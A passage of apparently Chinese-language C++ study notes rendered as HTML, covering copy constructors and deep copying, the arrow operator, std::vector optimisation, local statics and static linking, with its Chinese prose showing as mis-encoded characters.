class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">String</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">  <span class="type">char</span>* m_buffer;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> m_size;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="built_in">String</span>(<span class="type">const</span> <span class="type">char</span>* string) &#123;</span><br><span class="line">    m_size = <span class="built_in">strlen</span>(string);</span><br><span class="line">    m_buffer = <span class="keyword">new</span> <span class="type">char</span>[m_size + <span class="number">1</span>];  <span class="comment">// åŒ…å«ç»“æŸå­—ç¬¦</span></span><br><span class="line">    <span class="built_in">strcpy_s</span>(m_buffer, m_size + <span class="number">1</span>, string); <span class="comment">// è‡ªåŠ¨ä¼šå¤åˆ¶ç»“æŸæ ‡å¿—</span></span><br><span class="line">    <span class="comment">//memcpy(m_buffer,string, m_size);</span></span><br><span class="line">    <span class="comment">//m_buffer[m_size] = 0;</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  ~<span class="built_in">String</span>() &#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;é‡Šæ”¾m_buffer&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">    <span class="keyword">delete</span>[] m_buffer;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="type">char</span>&amp; <span class="keyword">operator</span>[](<span class="type">const</span> <span class="type">unsigned</span> <span class="type">int</span> index) &#123;</span><br><span class="line">    <span class="keyword">return</span> m_buffer[index];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// å‹å…ƒå£°æ˜ï¼Œè®©ç±»å¤–å‡½æ•°å¯ä»¥è®¿é—®string</span></span><br><span class="line">  <span class="keyword">friend</span> std::ostream&amp; <span class="keyword">operator</span>&lt;&lt;(std::ostream&amp; stream, <span class="type">const</span> String&amp; string);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">std::ostream&amp; <span class="keyword">operator</span>&lt;&lt;(std::ostream&amp; stream, <span class="type">const</span> String&amp; string) &#123;</span><br><span class="line">  stream &lt;&lt; string.m_buffer;</span><br><span class="line">  <span class="keyword">return</span> stream;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  String s1 = <span class="string">&quot;JKA&quot;</span>;</span><br><span class="line">  String s2 = s1;</span><br><span class="line">  s2[<span class="number">2</span>] = <span class="string">&#x27;B&#x27;</span>;</span><br><span class="line"></span><br><span class="line">  std::cout &lt;&lt; s1 &lt;&lt; std::endl;</span><br><span class="line">  std::cout &lt;&lt; s2 &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç”±äºs1å’Œs2çš„<strong>m_bufferæŒ‡å‘åŒä¸€ç¼“å†²åŒº</strong>ï¼Œè¶…å‡ºä½œç”¨åŸŸæ—¶ä¸¤å˜é‡å…ˆåæ‰§è¡Œææ„å‡½æ•°ï¼Œä¼šé€ æˆdouble freeçš„é—®é¢˜ã€‚</p><p><strong>C++é»˜è®¤æ‹·è´å‡½æ•°ï¼Œå¦‚æœä¸é‡æ„å°±éšå¼è°ƒç”¨å¦‚ä¸‹å‡½æ•°ï¼š</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">String</span>(<span class="type">const</span> String&amp; other)  <span class="comment">// ç±»å‹æ˜¯ &quot;const ç±» &amp;&quot;</span></span><br><span class="line">: <span class="built_in">m_Buffer</span>(other.m_Buffer), <span class="built_in">m_Size</span>(other.m_Size) &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// æˆ–è€…</span></span><br><span class="line"><span class="built_in">String</span> (<span class="type">const</span> String&amp; other) &#123;</span><br><span class="line">  <span class="built_in">memcpy</span>(<span class="keyword">this</span>, &amp;other, <span class="built_in">sizeof</span>(String));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ·±å¤åˆ¶ï¼šè¿™é‡Œçš„æ–¹æ³•æ˜¯ <strong>æ‹·è´æ„é€ å‡½æ•°</strong>ï¼Œå½“å¤åˆ¶ç¬¬äºŒä¸ªå­—ç¬¦ä¸²æ—¶ä¼šè¢«è°ƒç”¨ã€‚</p><p>ä½¿ç”¨æ·±æ‹·è´åçš„ä»£ç ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">String</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">  <span class="type">char</span>* m_buffer;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> m_size;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="built_in">String</span>(<span class="type">const</span> <span class="type">char</span>* string) &#123;</span><br><span class="line">    m_size = <span class="built_in">strlen</span>(string);</span><br><span class="line">    m_buffer = <span class="keyword">new</span> <span class="type">char</span>[m_size + <span class="number">1</span>];  <span class="comment">// åŒ…å«ç»ˆæ­¢å­—ç¬¦</span></span><br><span class="line">    <span class="built_in">strcpy_s</span>(m_buffer, m_size + <span class="number">1</span>, string); <span class="comment">// è‡ªåŠ¨å¤åˆ¶ä¸­æŒ‡æ ‡å¿—</span></span><br><span class="line">    <span class="comment">//memcpy(m_buffer, /*string, m_size);</span></span><br><span class="line">    <span class="comment">//m_buffer[m_size] = 0;*/</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">String</span>(<span class="type">const</span> String&amp; other)  <span class="comment">// æ‹·è´æ„é€ å‡½æ•°ï¼Œæ³¨æ„å‚æ•°</span></span><br><span class="line">    : <span class="built_in">m_size</span>(other.m_size) &#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Copy&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">    m_buffer = <span class="keyword">new</span> <span class="type">char</span>[m_size + <span class="number">1</span>];</span><br><span class="line">    <span class="built_in">memcpy</span>(m_buffer, other.m_buffer, m_size + <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  ~<span class="built_in">String</span>() &#123;</span><br><span class="line">    <span class="keyword">delete</span>[] m_buffer;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="type">char</span>&amp; <span class="keyword">operator</span>[](<span class="type">const</span> <span class="type">unsigned</span> <span class="type">int</span> index) &#123;</span><br><span class="line">    <span class="keyword">return</span> m_buffer[index];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// å‹å…ƒå£°æ˜</span></span><br><span class="line">  <span class="keyword">friend</span> std::ostream&amp; <span class="keyword">operator</span>&lt;&lt;(std::ostream&amp; stream, <span class="type">const</span> String&amp; string);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">std::ostream&amp; <span class="keyword">operator</span>&lt;&lt;(std::ostream&amp; stream, <span class="type">const</span> String&amp; string) &#123;</span><br><span class="line">  stream &lt;&lt; string.m_buffer;</span><br><span class="line">  <span class="keyword">return</span> stream;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">PrintString</span><span class="params">(String string)</span> </span>&#123;</span><br><span class="line">  std::cout &lt;&lt; string &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  String s1 = <span class="string">&quot;JKA&quot;</span>;</span><br><span class="line">  String s2 = s1;</span><br><span class="line">  s2[<span class="number">2</span>] = <span class="string">&#x27;B&#x27;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">PrintString</span>(s1);</span><br><span class="line">  <span class="built_in">PrintString</span>(s2);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Out</span></span><br><span class="line">Copy</span><br><span class="line">Copy</span><br><span class="line">JKA</span><br><span class="line">Copy</span><br><span class="line">JKB</span><br></pre></td></tr></table></figure><p>é—®é¢˜çš„åŸå› æ˜¯æ²¡æœ‰PrintStringä¸­æœªä½¿ç”¨å¼•ç”¨ï¼Œè€Œæ˜¯ç”±è¿›è¡Œäº†å¤åˆ¶ã€‚</p><blockquote><p>ğŸ’¡ æŠ€å·§ï¼šå°½å¯èƒ½é€šè¿‡constå¼•ç”¨å»ä¼ é€’å‚æ•°ã€‚</p></blockquote><h1 id="45-The-Arrow-Operator-in-C">45 The Arrow Operator in C++</h1><p>-&gt; æ˜¯ (*pointer).member; çš„è¯­æ³•ç³–ã€‚</p><p>constæŒ‡é’ˆåªèƒ½è°ƒç”¨constæ–¹æ³•ã€‚</p><p>ä¸€ç§ç”¨ç®­å¤´è®¡ç®—åç§»é‡çš„æ–¹æ³•ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">Vector3</span> &#123;</span><br><span class="line">  <span class="type">float</span> x, y, z;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> offset = (<span class="type">int</span>)&amp;((Vector3*)<span class="literal">nullptr</span>)-&gt;y;  <span class="comment">// å–yæˆå‘˜çš„åœ°å€</span></span><br><span class="line">  std::cout &lt;&lt; offset &lt;&lt; std::endl;</span><br><span class="line">  std::cin.<span class="built_in">get</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="46-Dynamic-Arrays-in-C-std-vector">46 Dynamic Arrays in C++ (std::vector)</h1><p>æ ‡å‡†æ¨¡æ¿åº“ï¼ˆStandard Template Library, STLï¼‰æœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªåº“ï¼Œé‡Œé¢è£…æ»¡äº†å®¹å™¨ã€å®¹å™¨ç±»å‹ï¼Œè¿™äº›å®¹å™¨åŒ…å«ç‰¹å®šçš„æ•°æ®ã€‚æ•´ä¸ªåº“æ¨¡æ¿åŒ–ï¼Œè¿™æ„å‘³ç€å®¹å™¨çš„åº•å±‚æ•°æ®ç±»å‹ç”±ç¨‹åºå‘˜å†³å®šã€‚</p><p>æ ‡å‡†æ¨¡ç‰ˆåº“çš„é€Ÿåº¦ä¸æ˜¯æœ€ä¼˜å…ˆè€ƒè™‘çš„ï¼Œéœ€è¦åŒæ—¶å…¼é¡¾å…¼å®¹æ€§å’Œæ€§èƒ½ï¼Œå¾ˆå¤šæƒ…å†µä¸‹å·¥ä½œå®¤å’Œå›¢é˜Ÿæœ€ç»ˆä¼šåˆ›å»ºè‡ªå·±çš„å®¹å™¨åº“ã€‚</p><p>vectorå…¶å®æ›´åº”å½“è¢«ç§°ä¸º<strong>ArrayList</strong>ã€‚åŸç†ï¼š<strong>å½“è¶…å‡ºç©ºé—´æ—¶ï¼Œä¼šåœ¨å†…å­˜ä¸­åˆ›å»ºä¸€ä¸ªæ¯”ç¬¬ä¸€ä¸ªå¤§çš„æ–°æ•°ç»„ï¼Œç„¶åæŠŠæ•°æ®éƒ½å¤åˆ¶åˆ°æ–°æ•°ç»„ï¼Œç„¶ååˆ é™¤æ—§çš„ã€‚</strong><br>vectorå€¾å‘äºç»å¸¸å¤åˆ¶ï¼Œæ‰€ä»¥å¹¶ä¸èƒ½è·å¾—æœ€ä½³æ€§èƒ½ã€‚</p><p>å­˜å‚¨vertexå¯¹è±¡æ¯”å­˜å‚¨æŒ‡é’ˆåœ¨æŠ€æœ¯ä¸Šæ›´ä¼˜ï¼ˆå®é™…ä¸Šå¾ˆéš¾è¯´ï¼Œè¦è§†æƒ…å†µè€Œå®šï¼‰ï¼Œå› ä¸ºåŠ¨æ€æ•°ç»„æ˜¯<strong>å†…å­˜è¿ç»­çš„æ•°ç»„ï¼Œå®ƒä»¬éƒ½åœ¨åŒä¸€æ¡é«˜é€Ÿç¼“å­˜çº¿ä¸Š</strong>ã€‚ä½†å­˜æ”¾æŒ‡é’ˆçš„è¯ï¼Œé‡æ–°åˆ†é…å†…å­˜æ—¶ï¼Œæ•°æ®ä¸ç”¨å¤åˆ¶åªç”¨å¤åˆ¶æŒ‡é’ˆã€‚</p><p>éå†æ—¶å°½é‡ä½¿ç”¨ <code>for (Vertex&amp; v : vertices)</code> ï¼ŒåŠ ä¸åŠ constå…³ç³»ä¸å¤§ï¼Œä½†åŠ &amp;å¯æœ‰æ•ˆé¿å…å¤åˆ¶ã€‚</p><p>åˆ é™¤ç¬¬2ä¸ªå…ƒç´ ï¼š<code>vertices.erase(vertices.begin() +1)</code> ï¼Œéœ€è¦ä¼ å…¥è¿­ä»£å™¨ï¼Œè€Œéåºå·ã€‚</p><h1 id="47-Optimizing-the-usage-of-std-vector-in-C">47 Optimizing the usage of std::vector in C++</h1><p>ç­–ç•¥ï¼šé¿å…å¤åˆ¶ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Vertex</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="type">int</span> x, y, z;</span><br><span class="line">  <span class="built_in">Vertex</span>(<span class="type">int</span> x, <span class="type">int</span> y, <span class="type">int</span> z)</span><br><span class="line">    : <span class="built_in">x</span>(x), <span class="built_in">y</span>(y), <span class="built_in">z</span>(z) &#123;&#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">Vertex</span>(<span class="type">const</span> Vertex&amp; vertex)  <span class="comment">// æ‹·è´æ„é€ å‡½æ•°</span></span><br><span class="line">    : <span class="built_in">x</span>(vertex.x), <span class="built_in">y</span>(vertex.y), <span class="built_in">z</span>(vertex.z) &#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Copied!&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  std::vector&lt;Vertex&gt; vertices;</span><br><span class="line">  vertices.<span class="built_in">push_back</span>(Vertex&#123; <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span> &#125;);</span><br><span class="line">  vertices.<span class="built_in">push_back</span>(&#123; <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span> &#125;);  <span class="comment">// éšå¼è½¬æ¢ï¼ŒåŒä¸Š</span></span><br><span class="line">  vertices.<span class="built_in">push_back</span>(&#123; <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span> &#125;);</span><br><span class="line">  std::cin.<span class="built_in">get</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Out</span></span><br><span class="line">Copied!</span><br><span class="line">Copied!</span><br><span class="line">Copied!</span><br><span class="line">Copied!</span><br><span class="line">Copied!</span><br><span class="line">Copied!</span><br></pre></td></tr></table></figure><p>åŒ…å«6æ¬¡copyï¼Œ3æ¬¡åœ¨mainæ ˆå¸§ä¸­åˆ›å»ºVertexå±€éƒ¨å˜é‡åä½œä¸ºå‚æ•°copyç»™push_backå‚æ•°ã€‚ç¬¬2æ¬¡push_backæ—¶éœ€è¦æ‰©å®¹ï¼Œå¤åˆ¶ç¬¬ä¸€ä¸ªVertexï¼Œç¬¬3æ¬¡push_backæ—¶ä¹Ÿéœ€è¦æ‰©å®¹ï¼Œå¤åˆ¶ç¬¬ä¸€ä¸ªå’Œç¬¬äºŒä¸ªVertexã€‚</p><p>ä¼˜åŒ–ï¼š</p><ul><li><strong>reserve æå‰ç”³è¯·å†…å­˜ï¼Œé¿å…åŠ¨æ€ç”³è¯·å¼€é”€</strong></li><li><strong>emplace_back ç›´æ¥åœ¨å®¹å™¨å°¾éƒ¨åˆ›å»ºå…ƒç´ ï¼Œçœç•¥æ‹·è´æˆ–ç§»åŠ¨è¿‡ç¨‹</strong></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  std::vector&lt;Vertex&gt; vertices;</span><br><span class="line">  vertices.<span class="built_in">reserve</span>(<span class="number">3</span>);</span><br><span class="line">  vertices.<span class="built_in">emplace_back</span>(Vertex&#123; <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span> &#125;);  <span class="comment">// 1æ¬¡copy, ä¸è¦è¿™æ ·å†™</span></span><br><span class="line">  vertices.<span class="built_in">emplace_back</span>(<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>);  <span class="comment">// æ— &#123;&#125;å–”</span></span><br><span class="line">  vertices.<span class="built_in">emplace_back</span>(<span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>);</span><br><span class="line">  std::cin.<span class="built_in">get</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Out</span></span><br><span class="line">Copied!</span><br></pre></td></tr></table></figure><h1 id="48-Local-Static-in-C">48 Local Static in C++</h1><p>local staticï¼šå¯ä»¥åœ¨å±€éƒ¨ä½œç”¨åŸŸä¸­ä½¿ç”¨staticæ¥å£°æ˜ä¸€ä¸ªå˜é‡ã€‚è€ƒè™‘å˜é‡çš„ç”Ÿå­˜æœŸå’Œä½œç”¨åŸŸã€‚</p><p>ç”Ÿå­˜æœŸâ€”â€”åœ¨è¢«åˆ é™¤å‰ï¼Œåœ¨å†…å­˜ä¸­ä¼šå­˜åœ¨å¤šä¹…ã€‚<br>ä½œç”¨åŸŸâ€”â€”æˆ‘ä»¬å¯ä»¥è®¿é—®å˜é‡çš„èŒƒå›´ã€‚</p><p>å‡½æ•°å†…çš„å±€éƒ¨é™æ€å’Œç±»æˆå‘˜çš„å±€éƒ¨é™æ€æ²¡æœ‰å¤šå°‘ä¸åŒï¼Œ<strong>é™¤äº†ç±»é™æ€æˆå‘˜å˜é‡å¯ä»¥è¢«ç±»çš„ä¸åŒå¯¹è±¡è®¿é—®ã€‚</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">Func</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">static</span> <span class="type">int</span> i = <span class="number">0</span>;   <span class="comment">// static å»¶é•¿äº†å˜é‡çš„ç”Ÿå­˜æœŸ</span></span><br><span class="line">  std::cout &lt;&lt; i++ &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">Func</span>();</span><br><span class="line">  <span class="built_in">Func</span>();</span><br><span class="line">  <span class="built_in">Func</span>();</span><br><span class="line">  std::cin.<span class="built_in">get</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Out</span></span><br><span class="line"><span class="number">0</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">2</span></span><br></pre></td></tr></table></figure><p>å¯èƒ½éœ€è¦åœ¨ç¨‹åºçš„æŸå¤„è°ƒç”¨ä¸€ä¸ªé™æ€åˆå§‹åŒ–å‡½æ•°æ¥åˆ›å»ºæ‰€æœ‰å¯¹è±¡ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Singleton</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="type">static</span> Singleton&amp; <span class="title">Get</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">static</span> Singleton* s_Instance;  <span class="comment">// static å»¶é•¿ç”Ÿå­˜æœŸè‡³æ°¸è¿œ</span></span><br><span class="line"></span><br><span class="line">    <span class="type">static</span> <span class="type">int</span> i = <span class="number">10</span>;</span><br><span class="line">    ++i;</span><br><span class="line">    std::cout &lt;&lt; i &lt;&lt; std::endl;</span><br><span class="line">    <span class="keyword">return</span> *s_Instance;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">Hello</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;hello&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  Singleton::<span class="built_in">Get</span>().<span class="built_in">Hello</span>();</span><br><span class="line">  Singleton::<span class="built_in">Get</span>().<span class="built_in">Hello</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><p>æœ¬äººå¯¹ç¨‹åºç¼–è¯‘é“¾æ¥è¿‡ç¨‹ç†è§£ä¸æ·±ï¼Œç­‰ä»¥åå†å®Œå–„ä¸‹é¢2èŠ‚çš„å†…å®¹ã€‚</p><h1 id="49-Using-Libraries-in-C-Static-Linking">49 Using Libraries in C++ (Static Linking)</h1><p>C++ä¸­æ²¡æœ‰åŒ…ç®¡ç†å™¨ã€‚</p><p>å¯¹äºå¤§å¤šæ•°ä¸¥è‚ƒçš„é¡¹ç›®ï¼ŒChern<strong>oæ¨èä»æºä»£ç æ„å»ºâ€”â€”ç¼–è¯‘å™¨å’Œé“¾æ¥å™¨ä¼šè¿›è¡Œä¼˜åŒ–ï¼Œè€Œéé“¾æ¥åˆ°é¢„æ„å»ºçš„äºŒè¿›åˆ¶æ–‡ä»¶</strong>ã€‚èƒ½å¸®åŠ©è°ƒè¯•ï¼Œå¦‚æœæƒ³ä¿®æ”¹åº“ç¨å¾®æ”¹å˜ä¸€ç‚¹å°±è¡Œã€‚</p><p>é€‰æ‹©32ä½è¿˜æ˜¯64ä½ï¼Œä¸å–å†³äºOSï¼Œè€Œå–å†³äºç›®æ ‡åº”ç”¨ç¨‹åºã€‚</p><p>åº“é€šå¸¸åŒ…å«ä¸¤éƒ¨åˆ†ï¼Œincludeå’Œlibraryï¼Œ<strong>includeæ˜¯ä¸€å †å¤´æ–‡ä»¶</strong>ï¼Œ<strong>libç›®å½•é‡Œæœ‰é‚£äº›é¢„å…ˆæ„å»ºçš„äºŒè¿›åˆ¶æ–‡ä»¶â€”â€”åŠ¨æ€åº“å’Œé™æ€åº“</strong>ï¼ˆå¹¶ä¸æ˜¯æ‰€æœ‰åº“éƒ½æä¾›2ç§ï¼‰ã€‚é™æ€é“¾æ¥åœ¨æŠ€æœ¯ä¸Šæ›´å¿«ï¼Œå› ä¸ºç¼–è¯‘å™¨å’Œé“¾æ¥å™¨å®é™…ä¸Šå¯æ‰§è¡Œé“¾æ¥æ—¶ä¼˜åŒ–ä¹‹ç±»çš„â€”â€”åœ¨é“¾æ¥æ—¶çŸ¥é“è¦é“¾æ¥çš„å‡½æ•°ã€‚è€ŒåŠ¨æ€é“¾æ¥åº“è¢«<strong>è¿è¡Œæ—¶çš„ç¨‹åºè£…è½½</strong>æ—¶ï¼Œç¨‹åºçš„éƒ¨åˆ†å°†è¢«è¡¥å……å®Œæ•´ã€‚</p><p>glfw3dll.libå®é™…ä¸ŠåŒ…å«äº†glfw3.dllä¸­æ‰€æœ‰çš„å‡½æ•°ã€ç¬¦å·ä½ç½®ï¼Œæ‰€ä»¥å¯ä»¥åœ¨ç¼–è¯‘æ—¶é“¾æ¥å®ƒä»¬ã€‚å¦‚æœæ²¡æœ‰æ­¤æ–‡ä»¶ï¼Œä¹Ÿèƒ½ä½¿ç”¨glfw3dllï¼Œä½†éœ€è¦é€šè¿‡å‡½æ•°åæ¥è®¿é—®dllæ–‡ä»¶å†…çš„å‡½æ•°ã€‚<br>glfw3.lib ä½œä¸ºé™æ€é“¾æ¥åº“æ¯”å…¶ä»–çš„å¤§å¾—å¤šï¼Œå¦‚æœä¸æƒ³ç¼–è¯‘æ—¶é“¾æ¥ï¼Œå°±é“¾æ¥è¿™ä¸ªï¼Œè¿™æ ·åœ¨exeè¿è¡Œæ—¶å°±ä¸éœ€è¦glfw3.dllã€‚</p><p>C++ä¸­å¯¹Cå‡½æ•°è¿›è¡Œå£°æ˜ï¼šexteren â€œCâ€ int gã€‚</p><h1 id="50-Using-Dynamic-Libraries-in-C">50 Using Dynamic Libraries in 